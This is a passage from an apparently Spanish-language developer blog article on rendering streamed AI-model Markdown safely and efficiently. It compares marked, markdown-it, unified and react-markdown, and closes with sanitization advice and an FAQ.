de código, así que una tabla que llega dentro de un ejemplo con valla se renderiza como código, luego
como tabla, luego otra vez como código cuando llega la valla de cierre. Un `[label](htt` a medio
escribir es texto literal en un frame y un enlace en el siguiente. Una tabla cuya fila delimitadora
todavía no ha llegado es un párrafo de caracteres de barra. Un solo `*` al final del buffer es un
asterisco literal hasta que aparece su pareja y el resto del párrafo se vuelve cursivo. Nada de esto es
un fallo del analizador — el analizador está renderizando correctamente un documento que de verdad
está incompleto.

**Sustituir `innerHTML` en cada frame destruye el estado de la página.** Se pierde la selección de
texto, un `<details>` abierto se cierra, el foco se mueve, y a un usuario que se desplazó hacia arriba
para leer algo se le arrastra de vuelta hacia abajo. Es además lo más costoso que puedes hacer por
token, porque estás descartando un DOM que estás a punto de reconstruir casi idéntico.

**El coste es cuadrático.** Volver a analizar y volver a sanear el buffer entero en cada trozo hace
que el trabajo por trozo crezca con la longitud de la respuesta. Una respuesta corta está bien; una de
dos mil palabras con cien trozos hace que cada uno de los últimos cien renderizados haga casi todo el
trabajo del final.

**Es fácil saltarse el saneado en los renderizados intermedios.** Sanear solo el HTML final es un
agujero con temporizador: cada frame antes del último puso HTML sin sanear en la página, y un
manejador `onerror` se dispara en el momento en que se analiza, no cuando termina el flujo.

Lo que funciona en su lugar es un pequeño conjunto de reglas:

1. **Renderiza según un reloj, no según cada trozo.** Agrupa los trozos y renderiza como máximo una
   vez por frame de animación, o cada 50 a 100 milisegundos. El texto llega más rápido de lo que
   nadie lee.
2. **Divide el buffer en asentado y en vivo.** Todo hasta la última línea en blanco que no esté dentro
   de una valla abierta ya no va a cambiar. Renderiza eso una vez, mantenlo en el DOM, y vuelve a
   renderizar solo la cola de después. Esto convierte el coste cuadrático de vuelta en lineal.
3. **Sigue tú mismo el estado de las vallas.** Cuenta los inicios de valla en el buffer; si el
   recuento es impar, estás dentro de un bloque de código. O cierra ese bloque para el renderizado
   intermedio, o renderiza la cola como un `<pre>` plano hasta que llegue la valla de cierre real.
   Cualquiera de las dos es más estable que dejar que el analizador adivine.
4. **Sanea cada renderizado, no el último.** La lista blanca cuesta microsegundos contra una cola de
   unos cuantos cientos de caracteres. No hay versión de esto donde un renderizado parcial esté
   exento.
5. **Prefiere un renderizador de componentes si estás en React.** `react-markdown` reconcilia un DOM
   virtual contra el anterior y aplica solo la diferencia, que es precisamente el problema que crea
   el streaming, y por eso resiste bajo un flujo donde un bucle crudo con `innerHTML` no lo hace.
6. **No cambies a un árbol de sintaxis esperando que ayude.** unified también vuelve a analizar desde
   cero. Un árbol te compra transformaciones, no análisis incremental.

Cuando el flujo termina y tienes el texto final, renderízalo una vez más desde arriba, limpiamente.
Ese último renderizado es el que se guarda, se copia o se exporta, y no debería llevar los compromisos
que necesitaba el renderizado en vivo — [convertir la salida de un modelo en una página que alguien
pueda leer](/blog/ai-output-to-a-shareable-page) es un trabajo distinto de mostrarla mientras llega.

## Dónde un árbol de sintaxis es la respuesta equivocada

La tubería unified es la opción más capaz aquí y recomendarla por defecto es el error más común en
este tema. Cuesta más de lo que dicen sus defensores, de cuatro maneras.

**Son siete dependencias antes de escribir una línea.** `unified`, `remark-parse`, `remark-gfm`,
`remark-rehype`, `rehype-raw`, `rehype-sanitize`, `rehype-stringify` — cada una con su propio ritmo de
versiones, su propio registro de cambios y su propia versión mayor que en algún momento se moverá sin
las demás. marked es un paquete. En una aplicación con una revisión de seguridad, una política de
cadena de suministro o un lockfile que alguien realmente lee, siete contra uno es una cifra que sale a
la conversación.

**Es solo ESM.** Los paquetes lo dicen ellos mismos. En una compilación moderna eso no es un problema;
en un servicio CommonJS, un bundler antiguo o un ejecutor de pruebas configurado hace años, es un día
de trabajo que no tiene nada que ver con Markdown.

**Es más lo que hay que resolver y ejecutar en el momento de importar.** Siete paquetes y sus propias
dependencias tienen que encontrarse y ejecutarse antes de que se analice el primer documento, donde
marked es uno solo. No hemos medido la diferencia y no te pediríamos que confiaras en nuestro número
si lo hubiéramos hecho; la forma del coste es lo que importa. En un servidor de larga duración se paga
una vez y desaparece; en una función serverless se paga en cada arranque en frío, por región, para
siempre.

**Tiene una curva de aprendizaje real para una primera tarea pequeña.** Añadir una clase a cada `<h2>`
significa saber que eso es un trabajo de hast, no de mdast, que quieres un plugin que devuelva un
transformador, que `unist-util-visit` es un paquete aparte, y que las propiedades de un nodo son
`properties` con `className` como array. La regla equivalente del renderer en markdown-it son cuatro
líneas y necesita un solo concepto. Si tu lista de transformaciones es «añadir ids a los encabezados»
y «añadir `rel` a los enlaces externos», ambas otras bibliotecas lo hacen sin un árbol, y habrás
instalado un compilador para cambiar dos cadenas de texto.

Lo contrario también es cierto, y es el fallo del que este artículo quiere avisar en la otra dirección:
si te encuentras ejecutando una expresión regular sobre HTML ya renderizado — sustituyendo `<h2>`,
buscando `<a href="`, contando `<img` — necesitabas el árbol y construiste uno peor. El HTML no es un
lenguaje regular, y cada una de esas sustituciones es correcta hasta que alguien escribe un bloque de
código que contiene la cadena que estabas buscando.

La posición honesta es que la mayoría de las páginas renderizan un documento, una vez, y nunca lo
transforman. Para esas páginas la tubería es código de configuración que lees para siempre sin ninguna
ganancia, y la respuesta correcta es la biblioteca pequeña más un sanitizador. Recurre a unified cuando
puedas nombrar la transformación, no cuando sospeches que podrías querer una.

## Cómo elegir

1. **Decide si vas a transformar el documento o solo a renderizarlo.** Si una transformación existe
   en cualquier parte de tus requisitos, elige un árbol ahora, porque añadirlo después significa
   reescribir cada personalización que hiciste contra tokens o métodos del renderer.
2. **Empareja el dialecto con los archivos que realmente tienes.** Convierte un documento real — uno
   con una tabla, una lista de tareas y una nota al pie — antes de comprometerte, porque una extensión
   que falta no da error, renderiza tu tabla como un párrafo de barras.
3. **Elige el sanitizador antes que el analizador.** El sanitizador tiene que correr en cada sitio
   donde corre el analizador, y DOMPurify sin un DOM devuelve tu entrada sin cambios, así que esta
   restricción decide más sobre la forma de tu código que la elección del analizador.
4. **Cuenta los entornos de ejecución.** Renderizar en el navegador y en el servidor significa una
   lista blanca importada por ambos, y una diferencia entre los dos aparece como un documento que se
   ve distinto cuando se comparte de cómo se veía cuando se escribió — lo que se lee como pérdida de
   datos para quien lo escribió.
5. **Nombra quién escribe la entrada.** Si es tu propio equipo con acceso de commit, MDX y el HTML
   crudo están disponibles para ti. Si es cualquier otra persona, no lo están, y ningún cuidado en la
   configuración cambia esa respuesta.
6. **Mira qué vas a tener que sobrescribir.** Escribe las cuatro cosas que ya sabes que necesitas — ids
   de encabezado, manejo de enlaces externos, resaltado de código, carga diferida de imágenes — y
   compara cada una con los puntos de extensión de la biblioteca antes de elegir, no después.
7. **Prueba con un archivo hostil, no con un README.** Un documento que contenga `<script>`, un
   atributo `onerror`, un enlace `javascript:` y una etiqueta `<base>` cuesta un minuto escribir y te
   dice más sobre tu tubería que una semana renderizando tu propia documentación.

## Qué hacer con esto

Escribe la lista blanca antes que el renderer, y llama al sanitizador dentro de la misma función que
el análisis, para que nadie pueda llegar a uno sin el otro. Sirve además la salida proporcionada por
usuarios bajo una política de seguridad de contenido: `script-src 'none'` no cuesta nada en una página
que siempre es solo un documento. Si la entrada es un archivo Word en vez de Markdown, eso es otra
biblioteca y otro conjunto de fallos — [mammoth y los otros analizadores de docx](/blog/mammoth-js-and-docx-parsers)
lo cubren. Después elige según la forma del problema y no según la popularidad de la respuesta: marked
para una cadena, markdown-it para un plugin, unified para un árbol, react-markdown para componentes, y
un sanitizador dedicado en los cuatro casos. Si necesitabas el HTML una vez en vez de una biblioteca en
tu paquete, [esta conversión](/) ejecuta los mismos dos pasos en tu navegador y devuelve un archivo
autocontenido.

## Preguntas frecuentes

### ¿Qué es más rápido, marked o markdown-it?

No hemos ejecutado un benchmark y no deberías elegir según el de otra persona. Ambos son analizadores
maduros escritos para el mismo trabajo, y en cualquier uso interactivo — un panel de vista previa, una
caja de comentarios, una página — la diferencia no es algo que vayas a notar. Merece la pena medirlo
cuando estás renderizando miles de documentos en una compilación, y en ese punto mide tus propios
documentos, porque la respuesta depende de lo que contienen y no de una cifra en el README de un
repositorio.

### ¿Es seguro usar marked con Markdown no confiable?

No por sí solo. Su README dice sin rodeos que no sanea su salida y te dirige a DOMPurify, sanitize-html
o insane (comprobado en github.com, 9 de septiembre de 2026). La antigua opción `sanitize` se ha
eliminado, así que el código que la pasa se ignora en silencio, lo cual es peor que no tener ninguna
protección porque parece protección.

### ¿Cómo añado ids a los encabezados para una tabla de contenidos?

En marked, sobrescribe el método `heading` del renderer o añade el paquete `marked-gfm-heading-id`. En
markdown-it, usa un plugin de anclas o sobrescribe la regla `heading_open` del renderer. En unified,
añade un plugin que recorra el árbol. Elijas lo que elijas, prefija el id — un id desnudo se convierte
en una propiedad con nombre en `window`, y un prefijo como `doc-` termina tanto con la colisión como
con el riesgo de clobbering.

### ¿Por qué mi tabla se renderiza como un párrafo de barras?

Las tablas no están en CommonMark, así que un análisis estrictamente conforme no produce una. Comprueba
`gfm` en marked, comprueba que no elegiste el preajuste `commonmark` en markdown-it, y comprueba que
`remark-gfm` está en tu tubería unified. El fallo es silencioso por diseño: una tabla que el analizador
no reconoce es un párrafo válido.

### ¿Necesito rehype-raw?

Solo si el Markdown contiene HTML crudo que quieres que se renderice. `remark-rehype` descarta el HTML
crudo en caso contrario, que es el comportamiento seguro por defecto. Si de todos modos lo añades,
necesitas también `allowDangerousHtml` en `remark-rehype`, y luego `rehype-sanitize` después de ambos
— el centro de esa secuencia es la parte donde existe un documento sin sanear.

### ¿Puedo usar estas bibliotecas en un navegador sin un bundler?

Sí. marked, markdown-it, micromark y snarkdown corren todas en un navegador y se pueden cargar desde un
CDN como módulos ES. Los paquetes unified son solo ESM, lo que los hace sencillos como módulos e
incómodos como una etiqueta script. Recuerda que un sanitizador también tiene que cargarse — un
renderer solo en la página es el agujero del que trata este artículo.

### ¿Cuál es la diferencia entre remark y rehype?

Son dos mitades de la misma tubería que trabajan sobre dos árboles distintos. remark trabaja sobre
mdast, el árbol de Markdown, donde los nodos son encabezados, listas y enlaces. rehype trabaja sobre
hast, el árbol de HTML, donde los nodos son elementos con nombres de etiqueta y propiedades.
`remark-rehype` es el puente, y saber en qué lado vive tu problema es la mayor parte de aprender
unified.
